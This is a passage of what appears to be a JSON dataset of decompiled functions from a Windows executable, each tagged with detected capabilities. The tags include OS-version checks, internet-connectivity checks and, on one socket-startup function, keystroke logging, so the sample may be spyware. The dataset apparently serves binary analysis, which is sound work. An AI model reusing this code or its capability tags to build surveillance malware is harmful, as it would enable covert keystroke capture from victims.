            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00425111(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00425a1f();\n    fcn.00427a76();\n    fcn.0040ad73();\n    if (param_1 == 0) {\n        iVar1 = fcn.0041bd38();\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x58) != NULL) {\n                (**(**(iVar1 + 0x58) + 4))(1);\n            }\n            *(iVar1 + 0x58) = 0;\n        }\n        iVar1 = fcn.00423dca();\n        if (*(iVar1 + 0x114) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar1 + 0x114) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00425357": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425357(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(param_1 + 1);\n    if (iVar1 == 0) {\n        (**(*param_1 + 0x10))();\n    }\n    return iVar1;\n}\n",
        "token_count": 105
    },
    "00425394": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00425394(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x42c4e8 == *param_2) && (param_2[1] == *0x42c4ec)) && (param_2[2] == *0x42c4f0)) &&\n           (param_2[3] == *0x42c4f4)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 460
    },
    "00425442": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00425442(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(*piVar3 + in_ECX);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 291
    },
    "00425615": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00425615(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x5c) = param_2;\n    if (param_2 != 1) {\n        param_2 = ((param_2 != 2) - 1 & 3) - 1;\n    }\n    return param_2;\n}\n",
        "token_count": 89
    },
    "004256ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004256ae(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    \n    iVar2 = *(param_1 + 0x50);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0x1c);\n    }\n    hWnd = param_1;\n    uVar1 = fcn.00422cc2(iVar2, &hWnd);\n    *(param_1 + 0x68) = uVar1;\n    fcn.0041dff5(param_1);\n    iVar2 = sub.oledlg.dll_OleUIBusyA(param_1 + 0x60);\n    fcn.0041e041();\n    fcn.0041dbc0();\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    uVar1 = 2;\n    if (iVar2 != 2) {\n        if (iVar2 == 0x75) {\n            *(param_1 + 0x8c) = 1;\n        }\n        else {\n            if (iVar2 != 0x76) {\n                if (iVar2 == 0x77) {\n                    *(param_1 + 0x8c) = 3;\n                    return 1;\n                }\n                uVar1 = fcn.00425615(iVar2);\n            }\n            *(param_1 + 0x8c) = uVar1;\n        }\n        return 1;\n    }\n    return 2;\n}\n",
        "token_count": 350
    },
    "00425799": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00425799(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00425357();\n    }\n    if (extraout_ECX[0xc] != NULL) {\n        fcn.0041bd2d(extraout_ECX[9]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041c304();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 245
    },
    "00425e81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00425e81(uint32_t *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t in_ECX;\n    int16_t *piVar9;\n    int16_t *piVar10;\n    ulong *puVar11;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = in_ECX;\n    puVar11 = arg_8h + 1;\n    if ((arg_14h == 6) || (arg_14h == 0xc)) {\n        *puVar11 = arg_10h;\n        puVar11 = arg_8h + 2;\n    }\n    bVar3 = false;\n    iVar2 = *arg_18h;\n    arg_14h = arg_18h[2];\n    var_4h = arg_18h[3];\n    arg_10h = arg_ch;\n    do {\n        if (*arg_10h == 0) {\ncode_r0x00426057:\n            if (arg_14h < 1) {\n                if (*arg_10h == 0) {\n                    iVar4 = 0;\n                }\n                else {\n                    *arg_1ch = arg_18h[2];\n                    iVar4 = -0x7ffdfff1;\n                }\n            }\n            else {\n                iVar4 = -0x7ffdfff2;\ncode_r0x00426062:\n                *arg_1ch = arg_14h;\n            }\n            return iVar4;\n        }\n        arg_14h = arg_14h + -1;\n        uVar1 = *arg_10h;\n        arg_8h = in_ECX & 0xffff0000 | uVar1;\n        if ((uVar1 != 0xff) && ((uVar1 & 0x40) != 0)) {\n            arg_8h = CONCAT11(0x40, uVar1 & 0xbf);\n        }\n        iVar8 = arg_8h;\n        if (arg_14h < var_4h) {\n            if (iVar8 == 0xff) {\n                arg_14h = arg_18h[3];\n                var_4h = 0;\n                bVar3 = true;\n                goto code_r0x0042604c;\n            }\n            if ((!bVar3) && (iVar8 == 0xc)) {\n                *0x44d788 = 10;\n                *0x44d790 = 0x80020004;\n                piVar9 = 0x44d788;\n                goto code_r0x00425fa3;\n            }\n            goto code_r0x00426057;\n        }\n        if (iVar8 == 0xff) goto code_r0x00426057;\n        piVar10 = iVar2 + arg_14h * 0x10;\n        piVar9 = piVar10;\n        if ((iVar8 != 0xc) && (iVar8 != *piVar10)) {\n            arg_ch = 0x8;\n            piVar9 = arg_20h + arg_14h * 0x10;\n            if (iVar8 != 0xe) {\n                arg_ch = arg_8h;\n            }\n            uVar7 = 4;\n            if ((*piVar10 != arg_ch) &&\n               (iVar4 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(piVar9, piVar10, 0, arg_ch),  uVar7 = arg_ch, \n               iVar4 < 0)) goto code_r0x00426062;\n            if (iVar8 == 0xe) {\n                if (*piVar10 == arg_ch) {\n                    uVar6 = fcn.00425200(uVar7, *(piVar10 + 4));\n                    *(piVar9 + 4) = uVar6;\n                    *piVar9 = 8;\n                }\n                else {\n                    uVar6 = *(piVar9 + 4);\n                    uVar5 = fcn.00425200(uVar6);\n                    *(piVar9 + 4) = uVar5;\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar6);\n                }\n                arg_8h = 0x8;\n            }\n        }\ncode_r0x00425fa3:\n        uVar7 = arg_8h & 0xffff;\n        if (0x11 < uVar7) {\n    // switch table (17 cases) at 0x4260bc\n            switch(uVar7) {\n            case 0x4002:\n            case 0x4003:\n            case 0x4004:\n            case 0x4005:\n            case 0x4006:\n            case 0x4007:\n            case 0x4008:\n            case 0x4009:\n            case 0x400a:\n            case 0x400b:\n            case 0x400c:\n            case 0x400d:\n            case 0x4012:\ncode_r0x00426045:\n                uVar7 = *(piVar9 + 4);\n                goto code_r0x00426048;\n            }\n            goto code_r0x0042604c;\n        }\n        if (uVar7 == 0x11) {\n            uVar7 = *(piVar9 + 4);\n            goto code_r0x00426048;\n        }\n    // switch table (12 cases) at 0x42608c\n        switch(uVar7) {\n        case 2:\n            uVar7 = piVar9[4];\n            break;\n        case 3:\n        case 4:\n        case 8:\n        case 9:\n        case 10:\n        case 0xd:\n            goto code_r0x00426045;\n        case 5:\n        case 7:\n            *puVar11 = *(piVar9 + 4);\n            goto code_r0x0042601a;\n        case 6:\n            *puVar11 = *(piVar9 + 4);\n            *(puVar11 + 4) = *(piVar9 + 6);\ncode_r0x0042601a:\n            puVar11 = puVar11 + 1;\n            goto code_r0x0042604c;\n        case 0xb:\n            uVar7 = piVar9[4] != 0;\n            break;\n        case 0xc:\n            *puVar11 = piVar9;\n            goto code_r0x0042604a;\n        default:\n            goto code_r0x0042604c;\n        }\ncode_r0x00426048:\n        *puVar11 = uVar7;\ncode_r0x0042604a:\n        puVar11 = puVar11 + 4;\ncode_r0x0042604c:\n        arg_10h = arg_10h + 1;\n        in_ECX = arg_8h;\n    } while( true );\n}\n",
        "token_count": 1621
    },
    "0042664b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0042664b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004207d2();\n    pcVar5 = *0x449654;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[3] = pcVar5;\n    extraout_ECX[5] = *0x449654;\n    extraout_ECX[6] = *0x449654;\n    iVar2 = *(unaff_EBP + 0xc);\n    iVar1 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 3;\n    iVar4 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.COleDispatchException.0;\n    extraout_ECX[4] = -(iVar2 != 0) & iVar2 + 0x60000U;\n    *(extraout_ECX + 2) = iVar1;\n    if (iVar4 != 0) {\n        fcn.0041d402(*(unaff_EBP + 8));\n    }\n    uVar3 = *(unaff_EBP + -0xc);\n    extraout_ECX[7] = (-(iVar1 != 0) & 0x7fff0001) + 0x8000ffff;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 452
    },
    "00426721": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426721(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[1] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0042673b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_68h\n\nvoid __cdecl fcn.0042673b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t *piVar9;\n    code *pcVar10;\n    int16_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint32_t *puVar14;\n    uint uVar15;\n    int32_t **extraout_ECX;\n    int32_t **ppiVar16;\n    int32_t iVar17;\n    int32_t unaff_EBP;\n    ulong *puVar18;\n    char *pcVar19;\n    uint *in_FS_OFFSET;\n    uint noname_1;\n    uint noname_0;\n    uint lpString2;\n    uint noname_3;\n    uint var_78h;\n    char *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint pvargDest;\n    uint pbstr;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint cchWideChar;\n    uint var_1ch;\n    uint lpMultiByteStr;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x426745;\n    fcn.0040b7d8();\n    piVar9 = *extraout_ECX;\n    *(unaff_EBP + -0x28) = extraout_ECX;\n    if (piVar9 != NULL) {\n        var_6ch = 0x10;\n        fcn.0040b990(unaff_EBP + -0x4c, 0);\n        pcVar19 = *(unaff_EBP + 0x18);\n        if (pcVar19 == NULL) {\n            iVar12 = *(unaff_EBP + -0x44);\n        }\n        else {\n            var_6ch = pcVar19;\n            iVar12 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            *(unaff_EBP + -0x44) = iVar12;\n        }\n        *(unaff_EBP + -0x1c) = 0xfffffffd;\n        if ((*(unaff_EBP + 0xc) & 0xc) != 0) {\n            *(unaff_EBP + -0x40) = 1;\n            *(unaff_EBP + -0x48) = unaff_EBP + -0x1c;\n        }\n        ppiVar16 = extraout_ECX;\n        if (iVar12 != 0) {\n            var_6ch = iVar12 << 4;\n            iVar12 = fcn.0041bd04();\n            *(unaff_EBP + -0x4c) = iVar12;\n            fcn.0040b990(iVar12, 0, *(unaff_EBP + -0x44) << 4);\n            cVar2 = *pcVar19;\n            *(unaff_EBP + -0x14) = pcVar19;\n            iVar12 = *(unaff_EBP + -0x44) * 0x10 + -0x10 + iVar12;\n            *(unaff_EBP + -0x10) = iVar12;\n            if (cVar2 != '\\0') {\n                puVar18 = iVar12 + 8;\n                *(unaff_EBP + -0x18) = puVar18;\n                iVar12 = *(unaff_EBP + 0x1c) + -4;\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -8;\n                do {\n                    puVar5 = *(unaff_EBP + -0x10);\n                    uVar3 = **(unaff_EBP + -0x14);\n                    *puVar5 = uVar3;\n                    if ((uVar3 & 0x40) != 0) {\n                        *puVar5 = CONCAT11(0x40, uVar3 & 0xbf);\n                    }\n                    uVar4 = *puVar5;\n                    if (0x4002 < uVar4) {\n    // switch table (15 cases) at 0x426be6\n                        switch(uVar4) {\n                        case 0x4003:\n                        case 0x4004:\n                        case 0x4005:\n                        case 0x4006:\n                        case 0x4007:\n                        case 0x4008:\n                        case 0x4009:\n                        case 0x400a:\n                        case 0x400c:\n                        case 0x400d:\n                        case 0x4011:\n                            goto code_r0x0042697b;\n                        case 0x400b:\n                            puVar14 = *(iVar12 + 4);\n                            *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                            *puVar14 = -(*puVar14 != 0) & 0xffff;\n                            break;\n                        default:\n                            goto code_r0x00426985;\n                        }\ncode_r0x00426983:\n                        iVar12 = iVar12 + 4;\n                        *puVar18 = puVar14;\n                        goto code_r0x00426985;\n                    }\n                    if (uVar4 == 0x4002) {\ncode_r0x0042697b:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar14 = *(iVar12 + 4);\n                        goto code_r0x00426983;\n                    }\n    // switch table (16 cases) at 0x426ba6\n                    switch(uVar4) {\n                    case 2:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar11 = *(iVar12 + 4);\n                        goto code_r0x0042684b;\n                    case 3:\n                    case 9:\n                    case 10:\n                    case 0xd:\n                        goto code_r0x0042697b;\n                    case 4:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        iVar12 = iVar12 + 8;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 5:\n                    case 7:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        iVar12 = iVar12 + 8;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 6:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar8 = *(iVar12 + 4);\n                        iVar12 = iVar12 + 4;\n                        *puVar18 = *puVar8;\n                        *(puVar18 + 4) = puVar8[1];\n                        break;\n                    case 8:\n                        var_6ch = *(iVar12 + 4);\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = iVar12 + 4;\n                        *(unaff_EBP + -0x18) = var_6ch;\n                        iVar13 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                        iVar17 = *(unaff_EBP + -0x18);\n                        *puVar18 = iVar13;\n                        if ((iVar17 != 0) && (iVar13 == 0)) {\n                            var_6ch = 0x4268bb;\n                            fcn.0041b368();\n                        }\n                        break;\n                    case 0xb:\n                        iVar17 = *(iVar12 + 4);\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar11 = -(iVar17 != 0);\ncode_r0x0042684b:\n                        iVar12 = iVar12 + 4;\n                        *puVar18 = iVar11;\n                        break;\n                    case 0xc:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar8 = *(iVar12 + 4);\n                        puVar6 = *(unaff_EBP + -0x10);\n                        iVar12 = iVar12 + 4;\n                        *puVar6 = *puVar8;\n                        puVar6[1] = puVar8[1];\n                        puVar6[2] = puVar8[2];\n                        puVar6[3] = puVar8[3];\n                        puVar18 = *(unaff_EBP + -0x18);\n                        break;\n                    case 0xe:\n                        var_6ch = *(iVar12 + 4);\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = iVar12 + 4;\n                        *(unaff_EBP + -0x18) = var_6ch;\n                        if (var_6ch != NULL) {\n                            var_6ch = *(unaff_EBP + -0x18);\n                            iVar17 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n                            *(unaff_EBP + -0x20) = iVar17 + 1;\n                            fcn.0040b610();\n                            *(unaff_EBP + -0x24) = &fcn.0042673b::var_6ch;\n                            var_6ch = var_6ch & 0xffff0000;\n                            (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                      (0, 0, *(unaff_EBP + -0x18), 0xffffffff, &fcn.0042673b::var_6ch, \n                                       *(unaff_EBP + -0x20));\n                            var_6ch = *(unaff_EBP + -0x24);\n                        }\n                        iVar13 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                        iVar17 = *(unaff_EBP + -0x18);\n                        *puVar18 = iVar13;\n                        if ((iVar17 != 0) && (iVar13 == 0)) {\n                            var_6ch = 0x42691e;\n                            fcn.0041b368();\n                        }\n                        **(unaff_EBP + -0x10) = 8;\n                        break;\n                    case 0x11:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar1 = iVar12 + 4;\n                        iVar12 = iVar12 + 4;\n                        *puVar18 = *puVar1;\n                    }\ncode_r0x00426985:\n                    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x10;\n                    puVar18 = puVar18 + -2;\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n                    *(unaff_EBP + -0x18) = puVar18;\n                } while (**(unaff_EBP + -0x14) != '\\0');\n                ppiVar16 = *(unaff_EBP + -0x28);\n                pcVar19 = *(unaff_EBP + 0x18);\n            }\n        }\n        var_6ch = unaff_EBP + -0x3c;\n        fcn.0040abd5();\n        fcn.0040b990(unaff_EBP + -0x6c, 0, 0x20);\n        piVar9 = *ppiVar16;\n        *(unaff_EBP + -0x2c) = 0xffffffff;\n        iVar12 = unaff_EBP + -0x4c;\n        noname_3 = *(unaff_EBP + 0xc);\n        lpString2 = 0;\n        noname_0 = 0x42c4d8;\n        noname_1 = *(unaff_EBP + 8);\n        uVar15 = (**(*piVar9 + 0x18))(piVar9);\n        *(unaff_EBP + 0x18) = uVar15;\n        if (*(unaff_EBP + -0x44) != 0) {\n            iVar17 = *(unaff_EBP + -0x44) * 0x10 + -0x10 + *(unaff_EBP + -0x4c);\n            cVar2 = *pcVar19;\n            while (cVar2 != '\\0') {\n                if ((*pcVar19 == '\\b') || (*pcVar19 == '\\x0e')) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(iVar17);\n                }\n                iVar17 = iVar17 + -0x10;\n                pcVar19 = pcVar19 + 1;\n                cVar2 = *pcVar19;\n            }\n        }\n        fcn.0041bd2d(*(unaff_EBP + -0x4c));\n        if (*(unaff_EBP + 0x18) < 0) {\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x3c);\n            if (*(unaff_EBP + 0x18) != -0x7ffdfff7) {\n                noname_0 = *(unaff_EBP + 0x18);\n                fcn.0042550a(noname_0, noname_0, lpString2, noname_3, iVar12);\n            }\n            if (*(unaff_EBP + -0x54) != 0) {\n                (**(unaff_EBP + -0x54))(unaff_EBP + -0x6c);\n            }\n            iVar12 = fcn.0041bd04(0x20);\n            *(unaff_EBP + 0x14) = iVar12;\n            *(unaff_EBP + -4) = 0;\n            if (iVar12 == 0) {\n                iVar12 = 0;\n            }\n            else {\n                noname_0 = 0;\n                iVar12 = fcn.0042664b(0, 0, *(unaff_EBP + -0x6c));\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            pcVar10 = _sym.imp.OLEAUT32.dll_SysStringLen;\n            if (*(unaff_EBP + -0x68) != 0) {\n                fcn.0041d429(*(unaff_EBP + -0x68));\n                (*pcVar10)(*(unaff_EBP + -0x68));\n            }\n            if (*(unaff_EBP + -100) != 0) {\n                fcn.0041d429(*(unaff_EBP + -100));\n                (*pcVar10)(*(unaff_EBP + -100));\n            }\n            if (*(unaff_EBP + -0x60) != 0) {\n                fcn.0041d429(*(unaff_EBP + -0x60));\n                (*pcVar10)(*(unaff_EBP + -0x60));\n            }\n            noname_1 = 0x4308c8;\n            *(iVar12 + 0x10) = *(unaff_EBP + -0x5c);\n            *(iVar12 + 0x1c) = *(unaff_EBP + -0x50);\n            *(unaff_EBP + 0x14) = iVar12;\n            fcn.0040c2cc(unaff_EBP + 0x14, 0x4308c8);\n        }\n        uVar7 = *(unaff_EBP + 0x10);\n        if (uVar7 != 0) {\n            if ((uVar7 != 0xc) &&\n               (iVar12 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)\n                                   (unaff_EBP + -0x3c, unaff_EBP + -0x3c, 0, uVar7),  iVar12 < 0)) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x3c);\n                fcn.0042550a(iVar12, noname_1, noname_0, lpString2, noname_3);\n            }\n    // switch table (16 cases) at 0x426c22\n            switch(uVar7 & 0xffff) {\n            case 2:\n                **(unaff_EBP + 0x14) = *(unaff_EBP + -0x34);\n                break;\n            case 3:\n            case 4:\n            case 9:\n            case 10:\n            case 0xd:\n                **(unaff_EBP + 0x14) = *(unaff_EBP + -0x34);\n                break;\n            case 5:\n            case 6:\n            case 7:\n                puVar8 = *(unaff_EBP + 0x14);\n                *puVar8 = *(unaff_EBP + -0x34);\n                puVar8[1] = *(unaff_EBP + -0x30);\n                break;\n            case 8:\n                fcn.004251bb(*(unaff_EBP + 0x14), *(unaff_EBP + -0x34));\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x34));\n                break;\n            case 0xb:\n                **(unaff_EBP + 0x14) = *(unaff_EBP + -0x34) != 0;\n                break;\n            case 0xc:\n                puVar8 = *(unaff_EBP + 0x14);\n                *puVar8 = *(unaff_EBP + -0x3c);\n                puVar8[1] = *(unaff_EBP + -0x38);\n                puVar8[2] = *(unaff_EBP + -0x34);\n                puVar8[3] = *(unaff_EBP + -0x30);\n                break;\n            case 0x11:\n                **(unaff_EBP + 0x14) = *(unaff_EBP + -0x34);\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 4326
    },
    "00426ced": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19ch\n\nuint __cdecl fcn.00426ced(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint *in_FS_OFFSET;\n    uint var_19ch;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = fcn.0042489d(0x423bfb);\n    if (*(iVar1 + 0xc) == 0) {\n        pcVar4 = *(unaff_EBP + 8);\n        if (pcVar4 == NULL) {\n            pcVar4 = unaff_EBP + -0x19c;\n        }\n        iVar2 = sub.WSOCK32.dll_WSAStartup(0x101, pcVar4);\n        if (iVar2 == 0) {\n            if ((*pcVar4 == '\\x01') && (pcVar4[1] == '\\x01')) {\n                *(iVar1 + 0xc) = 0x426cbb;\n                iVar1 = fcn.0042401d();\n                if (*(iVar1 + 0x30) == 0) {\n                    iVar2 = fcn.0041bd04(0x1c);\n                    *(unaff_EBP + 8) = iVar2;\n                    *(unaff_EBP + -4) = 0;\n                    if (iVar2 == 0) {\n                        uVar3 = 0;\n                    }\n                    else 